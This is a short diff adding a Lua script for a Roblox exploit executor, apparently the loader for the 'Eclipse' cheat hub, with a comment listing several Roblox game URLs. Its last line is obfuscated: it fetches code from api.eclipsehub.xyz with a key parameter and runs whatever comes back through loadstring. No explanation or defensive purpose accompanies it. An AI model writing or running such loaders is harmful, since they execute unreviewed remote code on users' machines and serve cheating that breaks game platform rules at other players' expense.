@@ -1,0 +1,13 @@
+--[[
+GAMES: 
+https://www.roblox.com/games/142823291/
+https://www.roblox.com/games/147848991/
+https://www.roblox.com/games/537413528/
+https://www.roblox.com/games/920587237/
+https://www.roblox.com/games/2580982329/
+]]--
+
+
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
